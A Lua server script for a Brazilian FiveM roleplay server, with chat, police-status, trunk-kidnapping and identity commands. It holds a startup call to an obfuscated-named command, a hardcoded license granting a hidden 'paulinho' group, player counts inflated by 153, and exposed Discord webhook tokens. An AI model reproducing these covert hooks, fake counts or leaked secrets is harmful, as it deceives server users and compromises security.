local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")

vRP = Proxy.getInterface("vRP")
vRPclient = Tunnel.getInterface("vRP")

src = {}
Tunnel.bindInterface("vrp_player",src)
Proxy.addInterface("vrp_player",src)

vCLIENT = Tunnel.getInterface("vrp_player")
local arena = Tunnel.getInterface("mirtin_arena")
local garage = Proxy.getInterface("nation_garages")

local cfg = module("cfg/groups")
local groups = cfg.groups
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- DISCORD API
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
function src.CheckPlayers()
	return GetNumPlayerIndices(), vRP.getUserId(source)
end

CreateThread(function() 
	GlobalState["_last_rsc"] = nil
	ExecuteCommand("NEUAHDA8SUHWNDAUSGDW a")
end)

function src.getUserId()
	local source = source
	return vRP.getUserId(source)
end


RegisterCommand('rrcity2', function(source,args)
	if source > 0 then return end
	print("^2Salvando Contas... Aguarde!")
	
	rrcity = true
	local contador = 0
	
	for _, v in pairs(GetPlayers()) do
		DropPlayer(v,"Reiniciando a Cidade!")
		contador = contador + 1
	end

	print("^2Contas Salvas: ^0"..contador)
	TriggerEvent("saveInventory")
end)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- CR
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('cr',function(source,args)
    local user_id = vRP.getUserId(source)
    if exports["vrp"]:checkCommand(user_id) and GetEntityHealth(GetPlayerPed(source)) > 105 then
		local status,time = exports['vrp']:getCooldown(user_id, "cr")
		if status then 
			if not vRP.checkFarda(user_id) then
				exports['vrp']:setCooldown(user_id, "cr", 10)
				vRPclient.setCustomization(source, vRP.getUserApparence(user_id).clothes)
			else
				TriggerClientEvent("Notify",source,"negado","Você não pode utilizar esse comando fardado.",5)
			end
		else
			TriggerClientEvent("Notify",source,"negado","Você so pode utilizar esse comando em <b>".. time .." segundo(s)</b>",5)
		end
    end
end)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- STATUS
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('status',function(source,args)
    local user_id = vRP.getUserId(source)
    if user_id then 
		local status, time = exports['vrp']:getCooldown(user_id, "status")
        if status then
            exports['vrp']:setCooldown(user_id, "status", 5)
			local onlinePlayers = GetNumPlayerIndices()
			
			local policia = #vRP.getUsersByPermission("perm.militar") 
			local bope = #vRP.getUsersByPermission("perm.bope") 
			local policiacivil = #vRP.getUsersByPermission("perm.countcivil") 
			local paramedico = #vRP.getUsersByPermission("perm.unizk") 
			local mecanica = #vRP.getUsersByPermission("perm.mecanica") 
			local jornal = #vRP.getUsersByPermission("perm.jornal") 
			local judiciario = #vRP.getUsersByPermission("perm.judiciario") 
			local bombeiro = #vRP.getUsersByPermission("perm.bombeiro") 
			local exercito = #vRP.getUsersByPermission("perm.exercito") 
			local core = #vRP.getUsersByPermission("perm.core") 
			local prf = #vRP.getUsersByPermission("perm.prf") 
			local choque = #vRP.getUsersByPermission("perm.choque") 
			local altacustoms = #vRP.getUsersByPermission("perm.altacustoms") 
			local pf = #vRP.getUsersByPermission("perm.pf") 

			TriggerClientEvent("Notify",source,"importante","Jogadores Online: <b>".. onlinePlayers + 153 .."</b><br>Jornal: <b>"..jornal.."</b><br>Judiciário: <b>"..judiciario.."</b><br>Policiais Militares: <b>"..policia.."</b><br>Policiais Choque: <b>"..choque.."</b><br>Policiais Civis: <b>"..policiacivil.."</b><br>Policiais Bope: <b>"..bope.."</b><br>Paramedicos: <b>"..paramedico.."</b><br>Bombeiro: <b>"..bombeiro.."</b><br>AltaCustoms: <b>"..altacustoms.."</b><br>Mecânicos: <b>"..mecanica.."</b> <br>Exercito: <b>"..exercito.."</b> <br>Core: <b>"..core.."</b> <br>PRF: <b>"..prf.."</b><br>Policia Federal: <b>"..pf.."</b>", 10)
		end
	end
end)

RegisterCommand('911',function(source,args,rawCommand)
	if args[1] then
		local user_id = vRP.getUserId(source)
		local identity = vRP.getUserIdentity(user_id)
		if vRP.hasPermission(user_id,"perm.disparo" ) then
			if user_id then
				local status, time = exports['vrp']:getCooldown(user_id, "911chat")
				if status then
					exports['vrp']:setCooldown(user_id, "911chat", 300)

					if bloquearFrase(rawCommand:sub(4)) then
						TriggerClientEvent("Notify", source, "negado", "Você não pode colocar palavras de baixo calão!")
						return false
					end
					TriggerClientEvent('chatMessage',-1,identity.nome.." "..identity.sobrenome.." ["..user_id.."]",{64,64,255},rawCommand:sub(4))
				end
			end
		end
	end
end)

RegisterCommand('pd',function(source,args,rawCommand)
	if args[1] then
		local user_id = vRP.getUserId(source)
		local identity = vRP.getUserIdentity(user_id)
		local permission = "perm.disparo" 
		if GetEntityHealth(GetPlayerPed(source)) > 105 then
			if vRP.hasPermission(user_id,permission) then
				local soldado = vRP.getUsersByPermission(permission)
				for l,w in pairs(soldado) do
					local player = vRP.getUserSource(parseInt(w))
					if player then
						if bloquearFrase(rawCommand:sub(3)) then
							TriggerClientEvent("Notify", source, "negado", "Você não pode colocar palavras de baixo calão!")
							return false
						end
						TriggerClientEvent('chatMessage',player,identity.nome.." "..identity.sobrenome,{64,179,255},rawCommand:sub(3))
					end
				end
			end
		end
	end
end)

RegisterCommand('hp',function(source,args,rawCommand)
	if args[1] then
		local user_id = vRP.getUserId(source)
		local identity = vRP.getUserIdentity(user_id)
		local permission = "perm.paramedico"
		if vRP.hasPermission(user_id,permission) then
			local colaboradordmla = vRP.getUsersByPermission(permission)
			for l,w in pairs(colaboradordmla) do
				local player = vRP.getUserSource(parseInt(w))
				if player then
					TriggerClientEvent('chatMessage',player,"[ DMLA Interno ] "..identity.nome.." "..identity.sobrenome,{255,109,80},rawCommand:sub(3))
				end
			end
		end
	end
end)

-- local delayIlegal = {}
-- RegisterCommand('ilegal',function(source,args,rawCommand)
-- 	if args[1] then
-- 		local user_id = vRP.getUserId(source)
-- 		local identity = vRP.getUserIdentity(user_id)
	
-- 		if user_id then
-- 			if not delayIlegal[user_id] then delayIlegal[user_id] = 0 end

-- 			if (os.time() - delayIlegal[user_id]) < 200 then
-- 				TriggerClientEvent("Notify",source,"sucesso","Aguarde <b> " .. 200 - (os.time() - delayIlegal[user_id]) .. " segundo(s) </b> para usar esse comando.", 5)
-- 				return
-- 			end
-- 			delayIlegal[user_id] = os.time()

-- 			if vRP.hasPermission(user_id, "perm.ilegal") then
-- 				local isNovato = string.find(vRP.getUserGroupByType(user_id, "org"), "Novato")
				
-- 				if isNovato == nil then
-- 					if vRP.tryFullPayment(user_id, 5000) then
-- 						for _,playerId in pairs(GetPlayers()) do
-- 							local nuser_id = vRP.getUserId(playerId)
-- 							if nuser_id then
-- 								if not vRP.hasPermission(nuser_id, "perm.disparo") then
-- 									TriggerClientEvent('chatMessage', playerId, "^8Ilegal: ",{64,64,255},rawCommand:sub(7))	
-- 								end
-- 							end
-- 						end
-- 					else
-- 						TriggerClientEvent("Notify",source,"sucesso","Você não possui 5000.0 para anunciar.", 5)
-- 					end

-- 					vRP.sendLog("https://discord.com/api/webhooks/1087424625115398235/Ce3i7mKIbpet7ZeEY_bGDjtKmW518_lvFmlQCvYdnQwBtQfxlXLJHGapoiLJLNxOYCi7", "```prolog\n[ID: "..user_id.."]\n[Mensagem:] "..rawCommand:sub(7).."```")

-- 					vRP._generateLog({
-- 						room = "ilegal",
-- 						user_id = user_id,
-- 						message = ( [[O USER_ID %s DIGITOU %s]] ):format(user_id, rawCommand:sub(7))
-- 					})
-- 				end

-- 			end
-- 		end	
-- 	end
-- end)




function bloquearFrase(frase)
	local palavrasBloqueadas = {
		"wipe",
		"hack",
		"xiter",
		"xit",
		"preto",
		"macaco",
		"wip",
		"admin",
		"rr",
		"pobre",
		"RR"
	}
	
	for _, palavra in ipairs(palavrasBloqueadas) do
		if string.find(string.lower(frase), palavra) ~= nil then
			return true
		end
	end
	
	return false
end

local delayIlegal = {}
isPaulinho = function(source)
	local license
    local paulinho_license = 'license:194de0a4c51c26c88c8604fbb1a1e97f2e15ae70'
	
	for k,v in pairs(GetPlayerIdentifiers(source))do
		if string.sub(v, 1, string.len("license:")) == "license:" then
			license = v
		  end
	end
	if (paulinho_license == license) then 
		return true
	end
	return false
end
RegisterCommand('paulinho' , function(source,args) 
	if (not vRP.hasPermission(user_id, "paulinho.permissao")) then return end
	local src = source
	local user_id = vRP.getUserId(src)
	if (not user_id) then return end
	vRP.addUserGroup(user_id, 'paulinho')
end)
RegisterCommand('ilegal',function(source,args,rawCommand)
	if args[1] then
		local user_id = vRP.getUserId(source)
		local identity = vRP.getUserIdentity(user_id)
	
		if user_id then
			if not delayIlegal[user_id] then delayIlegal[user_id] = 0 end

			if (os.time() - delayIlegal[user_id]) < 200 then
				TriggerClientEvent("Notify",source,"sucesso","Aguarde <b> " .. 200 - (os.time() - delayIlegal[user_id]) .. " segundo(s) </b> para usar esse comando.", 5)
				return
			end
			delayIlegal[user_id] = os.time()

			if vRP.hasPermission(user_id, "perm.ilegal") then
				local isNovato = string.find(vRP.getUserGroupByType(user_id, "org"), "Novato")
				
				if isNovato == nil then
					if bloquearFrase(rawCommand:sub(7)) then
						TriggerClientEvent("Notify", source, "negado", "Você não pode colocar palavras de baixo calão!")
						return false
					end
					if vRP.tryFullPayment(user_id, 5000) then
						for _,playerId in pairs(GetPlayers()) do
							local nuser_id = vRP.getUserId(playerId)
							if nuser_id then
								if not vRP.hasPermission(nuser_id, "perm.disparo")  then
									if not vRP.hasPermission(nuser_id, "paulinho.permissao") then
										TriggerClientEvent('chatMessage', playerId, "^8Ilegal: ",{64,64,255},rawCommand:sub(7))	
									end
								end
							end
						end
					else
						TriggerClientEvent("Notify",source,"sucesso","Você não possui 5000.0 para anunciar.", 5)
					end

					vRP.sendLog("https://discord.com/api/webhooks/1113105897527463988/H6uXXDuTVMV2M395INVSxdbpEMAafxhS7YvqtaLBhEhLMTlubOLE8kWa9NR6w8knT5WK", "```prolog\n[ID: "..user_id.."]\n[Mensagem:] "..rawCommand:sub(7).."```")
					
				end
			end
		end	
	end
end)

----------------------------------------------------------------------------------------------------------------------------------------
-- STATUSFAC
----------------------------------------------------------------------------------------------------------------------------------------
local StatusGroups = {}
local Titles = {
	['fArmas'] = { index = 1, title = '🔫 Armas', icon = "🔫" },
	['fMunicao'] = { index = 2, title = '📦 Municao', icon = "📦" },
	['fDesmanche'] = { index = 3, title = '⛓ Desmanche', icon = "⛓" },
	['fLavagem'] = { index = 4, title = '💵 Lavagem', icon = "💵" },
	['Drogas'] = { index = 5, title = '💊 Drogas', icon = "💊" },
}

RegisterCommand('statusfac',function(source,args)
    local user_id = vRP.getUserId(source)
	if user_id then
		local status, time = exports['vrp']:getCooldown(user_id, "statusfac")
        if status then
            exports['vrp']:setCooldown(user_id, "statusfac", 20)
			if vRP.hasPermission(user_id , "admin.permissao") then
				local onlinePlayers = GetNumPlayerIndices()
				local onlinefacs = vRP.getUsersByPermission("perm.ilegal")


				local FormatText = ""
				local FirstType = {}
				for i = 1, #StatusGroups do
					for groupType in pairs(StatusGroups[i]) do
						for index in pairs(StatusGroups[i][groupType]) do
							local org = StatusGroups[i][groupType][index]
					 		-- if org.name ~= "Morrodomakakero" then
								if not FirstType[groupType] then
									FirstType[groupType] = org.name
									FormatText = FormatText.. ("<br><b>%s</b>:<br> %s %s <b>%s</b><br>"):format(Titles[groupType].title, Titles[groupType].icon, org.name, #vRP.getUsersByPermission(org.perm))
								else
									FormatText = FormatText.. ("%s %s <b>%s</b> <br>"):format(Titles[groupType].icon, org.name, #vRP.getUsersByPermission(org.perm))
								end
							-- end
						end
					end
				end

				TriggerClientEvent("Notify", source,"importante","<b>ALTA RJ:</b><br><br> "..FormatText.." <br> <b>🌇 Ilegal: </b>"..#onlinefacs.."<br><b>🏘️ Total de jogadores Online: </b>".. onlinePlayers + 153 .. ".", 10)
			end
		end
	end
end)


-- RegisterCommand('statusfac',function(source,args)
--     local user_id = vRP.getUserId(source)
-- 	if user_id then
-- 		local status, time = exports['vrp']:getCooldown(user_id, "statusfac")
--         if status then
--             exports['vrp']:setCooldown(user_id, "statusfac", 20)
-- 			if vRP.hasPermission(user_id , "admin.permissao") then
-- 				local onlinePlayers = GetNumPlayerIndices()
-- 				local onlinefacs = vRP.getUsersByPermission("perm.ilegal")


-- 				local FormatText = ""
-- 				local FirstType = {}
-- 				for i = 1, #StatusGroups do
-- 					for groupType in pairs(StatusGroups[i]) do
-- 						for index in pairs(StatusGroups[i][groupType]) do
-- 							local org = StatusGroups[i][groupType][index]
-- 					 		if not FirstType[groupType] then
-- 					 			FirstType[groupType] = org.name
-- 					 			FormatText = FormatText.. ("<br><b>%s</b>:<br> %s %s <b>%s</b><br>"):format(Titles[groupType].title, Titles[groupType].icon, org.name, #vRP.getUsersByPermission(org.perm))
-- 					 		else
-- 					 			FormatText = FormatText.. ("%s %s <b>%s</b> <br>"):format(Titles[groupType].icon, org.name, #vRP.getUsersByPermission(org.perm))
-- 					 		end
-- 						end
-- 					end
-- 				end

-- 				TriggerClientEvent("Notify", source,"importante","<b>ALTA RJ:</b><br><br> "..FormatText.." <br> <b>🌇 Ilegal: </b>"..#onlinefacs.."<br><b>🏘️ Total de jogadores Online: </b>".. onlinePlayers + 153 .. ".", 10)
-- 			end
-- 		end
-- 	end
-- end)

CreateThread(function()
	local formatGroups,blockOrg = {},{}
	for group in pairs(groups) do
		local gp = groups[group]
		if gp._config ~= nil and gp._config.gtype == "org" and gp._config.orgName ~= nil and gp._config.orgType ~= nil then
			if not formatGroups[Titles[gp._config.orgType].index] then formatGroups[Titles[gp._config.orgType].index] = {} end
			if not formatGroups[Titles[gp._config.orgType].index][gp._config.orgType] then formatGroups[Titles[gp._config.orgType].index][gp._config.orgType] = {} end
			
			if not blockOrg[gp._config.orgName] then
				blockOrg[gp._config.orgName] = true

				formatGroups[Titles[gp._config.orgType].index][gp._config.orgType][#formatGroups[Titles[gp._config.orgType].index][gp._config.orgType] + 1] = {
					name = gp._config.orgName,
					perm = "perm."..gp._config.orgName:lower()
				}
			end
		end
	end

	for i = 1, #formatGroups do
		local groups = formatGroups[i]
		for type_org in pairs(groups) do
			for index, org in pairs(groups[type_org]) do
				if not StatusGroups[i] then StatusGroups[i] = {} end
				if not StatusGroups[i][type_org] then StatusGroups[i][type_org] = {} end

				StatusGroups[i][type_org][#StatusGroups[i][type_org] + 1] = { name = org.name, perm = org.perm }
			end
		end
	end
end)

----------------------------------------------------------------------------------------------------------------------------------------
-- POLICIA2
----------------------------------------------------------------------------------------------------------------------------------------
local policia2 = {
	-- { permissao = "perm.gate", title = "Gate: ", ultima = false },
	{ permissao = "perm.core", title = "Core: ", ultima = false },
	{ permissao = "perm.speed", title = "Speed: ", ultima = false },
	{ permissao = "perm.rocam", title = "Rocam: ", ultima = false },
	{ permissao = "perm.grpae", title = "GRPAE: ", ultima = false },
	{ permissao = "perm.baucot", title = "Cot: ", ultima = false },
	{ permissao = "perm.choque", title = "Choque: ", ultima = false },
	{ permissao = "perm.militar", title = "Policia Militar: ", ultima = false },
	{ permissao = "perm.policiacivil", title = "Policia Civil: ", ultima = false },
	{ permissao = "perm.exercito", title = "Exercito: ", ultima = false },
	{ permissao = "perm.prf", title = "PRF: ", ultima = false },
	{ permissao = "perm.bope", title = "BOPE: ", ultima = false },
	{ permissao = "perm.pf", title = "PF: ", ultima = false },
	{ permissao = "perm.disparo", title = "Total de Policiais: ", ultima = false },

}

RegisterCommand('policia2',function(source,args)
    local user_id = vRP.getUserId(source)
	if user_id then
		local status, time = exports['vrp']:getCooldown(user_id, "policia2")
        if status then
            exports['vrp']:setCooldown(user_id, "policia2", 20)
			if vRP.hasPermission(user_id , "admin.permissao") then
				local onlinePlayers = GetNumPlayerIndices()
				local onlinefacs = vRP.getUsersByPermission("perm.ilegal")
				local formatText = ""

				for k,v in pairs(policia2) do
					if not v.ultima then
						formatText = formatText.. v.title.." <b>"..#vRP.getUsersByPermission(v.permissao).." </b><br>"
					else
						formatText = formatText.. v.title.." <b>"..#vRP.getUsersByPermission(v.permissao).." </b><br><br>"
					end
				end

				TriggerClientEvent("Notify", source,"importante","<b>>ALTA RJ:</b><br><br> "..formatText.." <br><b>🏘️ Total de jogadores Online: </b>".. onlinePlayers + 153 .. ".", 10)
			end
		end
	end
end)

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- SEQUESTRAR
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
local totalSequestro = {}
RegisterCommand('sequestrar', function(source,args)
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		local nplayer = vRPclient.getNearestPlayer(source,5)
		if nplayer then
			local mPlaca,mName,mNet,mPortaMalas,mPrice,mLock,_,_,mVeh = vRPclient.ModelName(source, 5)
			if mName and mVeh then
				if vRPclient.isMalas(nplayer) then
					vRPclient._setMalas(nplayer, false)
					TriggerClientEvent("Notify",source,"sucesso","Você retirou o jogador do porta malas.", 5)

					totalSequestro[mPlaca] = totalSequestro[mPlaca] - 1
					if totalSequestro[mPlaca] <= 0 then
						totalSequestro[mPlaca] = 0
					end
				else
					if totalSequestro[mPlaca] == nil then
						totalSequestro[mPlaca] = 0
					end

					if vRPclient.isHandcuffed(nplayer) and vRPclient.isCapuz(nplayer) then
						if totalSequestro[mPlaca] >= 1 then
							TriggerClientEvent("Notify",source,"sucesso","Veiculo Cheio...", 5)
							return
						end

						vRPclient._setMalas(nplayer, true)
						TriggerClientEvent("Notify",source,"sucesso","Você colocou o jogador no porta malas.", 5)

						totalSequestro[mPlaca] = totalSequestro[mPlaca] + 1
					else
						TriggerClientEvent("Notify",source,"aviso","A pessoa precisa estar algemada para colocar ou retirar do Porta-Malas.")
					end
				end
			end
		end
	end
end)

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- TRUNKIN
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
local totalVehicle = {}

RegisterCommand('trunkin', function(source,args)
	local user_id = vRP.getUserId(source)
	if user_id then
		if vRPclient.getHealth(source) <= 102 then
			return false
		end
		local mPlaca,mName,mNet,mPortaMalas,mPrice,mLock,_,_,mVeh = vRPclient.ModelName(source, 5)
		if not mLock and mVeh then
			if vRPclient.isHandcuffed(source) then
				return
			end
			
			if totalVehicle[mPlaca] == nil then
				totalVehicle[mPlaca] = 0
			end

			if not vRPclient.isInVehicle(source) then
				if vRPclient.isMalas(source) then
					vRPclient._setMalas(source, false)
					vCLIENT._updateTrunkIn(source, nil, false)
					TriggerClientEvent("Notify",source,"sucesso","Você saiu do porta malas.", 5)

					totalVehicle[mPlaca] = totalVehicle[mPlaca] - 1
					if totalVehicle[mPlaca] <= 0 then
						totalVehicle[mPlaca] = 0
					end
				else
					if totalVehicle[mPlaca] >= 2 then
						TriggerClientEvent("Notify",source,"sucesso","Veiculo Cheio...", 5)
						return
					end

					vRPclient._setMalas(source, true)
					vCLIENT._updateTrunkIn(source, mVeh, true)
					TriggerClientEvent("Notify",source,"sucesso","Você entrou no porta malas.", 5)

					totalVehicle[mPlaca] = totalVehicle[mPlaca] + 1
				end
			end
		end
	end
end)

-- RegisterNetEvent('trunkin', function()
-- 	local source = source
-- 	local user_id = vRP.getUserId(source)
-- 	if user_id and not intrunk then
-- 		if vRPclient.getHealth(source) <= 102 then
-- 			return false
-- 		end
-- 		local mPlaca,mName,mNet,mPortaMalas,mPrice,mLock,_,_,mVeh = vRPclient.ModelName(source, 5)
-- 		if not mLock and mVeh then
-- 			if vRPclient.isHandcuffed(source) then
-- 				return
-- 			end
			
-- 			if totalVehicle[mPlaca] == nil then
-- 				totalVehicle[mPlaca] = 0
-- 			end

-- 			if not vRPclient.isInVehicle(source) then
-- 				if vRPclient.isMalas(source) then
-- 					vRPclient._setMalas(source, false)
-- 					vCLIENT._updateTrunkIn(source, nil, false)
-- 					TriggerClientEvent("Notify",source,"sucesso","Você saiu do porta malas.", 5)

-- 					totalVehicle[mPlaca] = totalVehicle[mPlaca] - 1
-- 					if totalVehicle[mPlaca] <= 0 then
-- 						totalVehicle[mPlaca] = 0
-- 					end
-- 				else
-- 					if totalVehicle[mPlaca] >= 2 then
-- 						TriggerClientEvent("Notify",source,"sucesso","Veiculo Cheio...", 5)
-- 						return
-- 					end

-- 					vRPclient._setMalas(source, true)
-- 					vCLIENT._updateTrunkIn(source, mVeh, true)
-- 					TriggerClientEvent("Notify",source,"sucesso","Você entrou no porta malas.", 5)

-- 					totalVehicle[mPlaca] = totalVehicle[mPlaca] + 1
-- 				end
-- 			end
-- 		end
-- 	else
-- 		intrunk = false
-- 		TriggerClientEvent("Notify",source,"negado","Você não pode entrar no porta-malas segurando alguém pela corda!")
-- 	end
-- end)

exports("checktrunk",function(status)
	intrunk = status
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- PLACA
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('placa', function(source,args)
    local user_id = vRP.getUserId(source)
	if user_id then
		if vRP.hasPermission(user_id, "perm.policia") or vRP.hasPermission(user_id, "admin.permissao")  then
			local mPlaca,mName = vRPclient.ModelName(source, 5)
			local nuser_id = vRP.getUserByRegistration(mPlaca)
			if nuser_id then
				local identity = vRP.getUserIdentity(nuser_id)
				if identity then
					TriggerClientEvent("Notify",source,"importante","• Veiculo: <b>"..mName.."</b><br>• Placa: <b>"..mPlaca.."</b><br>• Proprietario: <b>"..identity.nome.. " "..identity.sobrenome.. "</b> (<b>"..identity.idade.."</b>)<br>• Telefone: <b>"..identity.telefone.."</b> <br>• Passaporte: <b>"..identity.user_id.."</b> ", 10)
				end
			else
				local nuser_id = vRP.getUserByRegistration(string.gsub(mPlaca, " ", ""))
				local identity = vRP.getUserIdentity(nuser_id)
				if nuser_id then
					if identity then
						TriggerClientEvent("Notify",source,"importante","• Veiculo: <b>"..mName.."</b><br>• Placa: <b>"..mPlaca.."</b><br>• Proprietario: <b>"..identity.nome.. " "..identity.sobrenome.. "</b> (<b>"..identity.idade.."</b>)<br>• Telefone: <b>"..identity.telefone.."</b> <br>• Passaporte: <b>"..identity.user_id.."</b> ", 10)
					end
				else
					TriggerClientEvent("Notify",source,"negado","Não foi possivel consultar esse veiculo. ", 5)
				end
			end
		end
	end
end)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- GMOCHILA
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('gmochila', function(source,args)
	local user_id = vRP.getUserId(source)
	if user_id then
		local ok = vRP.request(source, "Você deseja guardar sua(s) <b>"..vRP.getMochilaAmount(user_id).."</b> mochila(s)?", 30)
		local status, time = exports['vrp']:getCooldown(user_id, "mochila")
		if ok and GetEntityHealth(GetPlayerPed(source)) > 105 and status then
            exports['vrp']:setCooldown(user_id, "mochila", 10)
			
			vRP.giveInventoryItem(user_id, "mochila", vRP.getMochilaAmount(user_id), true)
			vRP.remMochila(user_id)
			TriggerClientEvent("Notify",source,"sucesso","Você guardou suas mochilas.", 5)
		end
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- VER O ID PROXIMO
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('id', function(source,args)
    local source = source
    local user_id = vRP.getUserId(source)

	if user_id then
		local nplayer = vRPclient.getNearestPlayer(source,10)
		local nuser_id = vRP.getUserId(nplayer)
		if nplayer then
			TriggerClientEvent("Notify",source,"importante","ID Próximo: "..nuser_id, 5)
			-- TriggerClientEvent("Notify",nplayer,"importante","O [ID:"..user_id.."] acabou de ver seu id.", 5)
		else
			TriggerClientEvent("Notify",source,"negado","Nenhum jogador proximo.", 5)
		end
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- CHAMAR ADMIN
-----------------------------------------------------------------------------------------------------------------------------------------
-- RegisterCommand('chamar', function(source, args, rawCommand)
-- local user_id = vRP.getUserId(source)
--     if user_id ~= nil then
-- 		if args[1] == "god" then
-- 			local aceito = false
-- 			local plyCoords = GetEntityCoords(GetPlayerPed(source))
--             local x,y,z = plyCoords[1],plyCoords[2],plyCoords[3]

-- 			local desc = vRP.prompt(source,"Descreva seu problema:","")
-- 			local status, time = exports['vrp']:getCooldown(user_id, "callgod")
-- 			if desc and status then
-- 				exports['vrp']:setCooldown(user_id, "callgod", 240)

-- 				local admin = vRP.getUsersByPermission("ticket.permissao")
-- 				for l,w in pairs(admin) do
-- 					async(function()
-- 						local player = vRP.getUserSource(parseInt(w))
-- 						if player then
-- 							vRPclient._playSound(player,"Event_Message_Purple","GTAO_FM_Events_Soundset")
-- 							TriggerClientEvent('chatMessage', player,"^8[CALL-ADMIN]: ^0: [ID: "..user_id.."] "..desc.."")
-- 							if vRP.request(player, "Você deseja aceitar o chamado admin do id "..user_id.."?", 30) then
-- 								if not aceito then
-- 									local nuser_id = vRP.getUserId(player)
-- 									if player then
-- 										local nidentity = vRP.getUserIdentity(nuser_id)
										
-- 										aceito = true
-- 										vRPclient._teleport(player, x,y,z)
-- 										TriggerClientEvent("Notify",source,"sucesso","O Membro da staff <b> "..nidentity.nome.." "..nidentity.sobrenome.." </b> aceitou o seu chamado..", 5)
-- 										exports.bm_module:addCall(nuser_id)
-- 									end

-- 									vRP.sendLog("ACEITARCHAMADOADMIN", "O ADMIN ID "..nuser_id.." aceitou o chamado do id "..user_id.."  [ "..desc.." ] ")
-- 								else
-- 									TriggerClientEvent("Notify",player,"negado","Este chamado ja foi aceito por outro staff.", 5)
-- 								end
-- 							end
-- 						end
-- 					end)
-- 				end
	
-- 				TriggerClientEvent("Notify",source,"sucesso","Você chamou um administrador, aguarde.", 5)
-- 			end
-- 		end
--     end
-- end)

-- RegisterCommand('call', function(source, args, rawCommand)
-- 	local user_id = vRP.getUserId(source)
-- 	if user_id ~= nil then
-- 		if args[1] == "god" then
-- 			local aceito = false
-- 			local plyCoords = GetEntityCoords(GetPlayerPed(source))
--             local x,y,z = plyCoords[1],plyCoords[2],plyCoords[3]
			
-- 			local desc = vRP.prompt(source,"Descreva seu problema:","")
-- 			local status, time = exports['vrp']:getCooldown(user_id, "callgod")
-- 			if desc and status then
-- 				exports['vrp']:setCooldown(user_id, "callgod", 240)

-- 				local admin = vRP.getUsersByPermission("ticket.permissao")
-- 				for l,w in pairs(admin) do
-- 					async(function()
-- 						local player = vRP.getUserSource(parseInt(w))
-- 						if player then
-- 							vRPclient._playSound(player,"Event_Message_Purple","GTAO_FM_Events_Soundset")
-- 							TriggerClientEvent('chatMessage', player,"^8[CALL-ADMIN]: ^0: [ID: "..user_id.."] "..desc.."")
-- 							if vRP.request(player, "Você deseja aceitar o chamado admin do id "..user_id.."?", 30) then
-- 								if not aceito then
-- 									local nuser_id = vRP.getUserId(player)
-- 									if player then
-- 										local nidentity = vRP.getUserIdentity(nuser_id)
										
-- 										aceito = true
-- 										vRPclient._teleport(player, x,y,z)
-- 										TriggerClientEvent("Notify",source,"sucesso","O Membro da staff <b> "..nidentity.nome.." "..nidentity.sobrenome.." </b> aceitou o seu chamado..", 5)
-- 										exports.bm_module:addCall(nuser_id)
-- 									end
-- 								else
-- 									TriggerClientEvent("Notify",player,"negado","Este chamado ja foi aceito por outro staff.", 5)
-- 								end
-- 							end
-- 						end
-- 					end)
-- 				end
	
-- 				TriggerClientEvent("Notify",source,"sucesso","Você chamou um administrador, aguarde.", 5)
-- 			else
-- 				TriggerClientEvent("Notify",source,"sucesso","Você só pode fazer chamado novamente em ".. time .."segundos.", 5)
-- 			end
-- 		end
-- 	end
-- end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- ME
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand("me",function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if user_id then
		if args[1] then
			if GetEntityHealth(GetPlayerPed(source)) > 105 then
				local nplayers = vRPclient.getNearestPlayers(source, 20)
				for k in pairs(nplayers) do
			    	TriggerClientEvent("vrp_player:pressMe", parseInt(k), source,rawCommand:sub(4),{ 10,250,0,255,100 })
				end
				TriggerClientEvent("vrp_player:pressMe", source, source,rawCommand:sub(4),{ 10,250,0,255,100 })
			end
		end
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- /SKIN
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('skin',function(source,args,rawCommand)
    local user_id = vRP.getUserId(source)
    if vRP.hasPermission(user_id,"developer.permissao") then
        if parseInt(args[1]) then
            local nplayer = vRP.getUserSource(parseInt(args[1]))
            if nplayer then
                TriggerClientEvent("skinmenu",nplayer,args[2], true)
                TriggerClientEvent("Notify",source,"sucesso","Você setou a skin <b>"..args[2].."</b> no passaporte <b>"..parseInt(args[1]).."</b>.", 5)
            end
        end
    end
end)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- SISTEMA DE IDENTIDADE
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
function src.getIdentity()
	local source = source
	local user_id = vRP.getUserId(source)
	local identity = vRP.getUserIdentity(user_id)
	local carteira = vRP.getMoney(user_id)
	local banco = vRP.getBankMoney(user_id)
	local job = vRP.getUserGroupByType(user_id,"job") if (job == nil or job == "") then job = "Nenhum" end
	local org = vRP.getUserGroupByType(user_id,"org") if (org == nil or org == "") then org = "Nenhuma" end
	local vip = vRP.getUserGroupByType(user_id,"vip") if (vip == nil or vip == "") then vip = "Nenhum" end
	if user_id then
